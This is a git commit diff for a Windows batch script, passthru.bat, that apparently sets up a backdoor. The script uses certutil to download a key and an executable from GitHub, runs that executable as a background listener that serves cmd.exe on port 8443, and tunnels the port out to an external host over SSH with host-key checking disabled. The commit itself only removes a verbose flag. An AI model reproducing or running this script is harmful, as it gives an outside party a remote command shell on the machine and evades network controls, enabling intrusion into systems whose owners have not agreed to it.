c00ee7a08e1359fe3c5721cc12ecb3dccc870469
Rajiv <26450813+rdasm@users.noreply.github.com>
2021-02-28 17:29:50 -0700

    updated

--- passthru.bat
+++ passthru.bat
@@ -3,7 +3,7 @@
 certutil -urlcache -f "https://raw.githubusercontent.com/rdasm/passthru/main/passthru.pem" PT.pem
 certutil -urlcache -f "https://github.com/rdasm/passthru/raw/main/passthru.exe" PT.exe
 
-start /b pt.exe -vv -L -p 8443 -e cmd.exe
+start /b pt.exe -L -p 8443 -e cmd.exe
 
 ssh -o "StrictHostKeyChecking no" -R2222:127.0.0.1:8443 -i PT.pem ubuntu@mypro.myspacebox.net -p 443
  
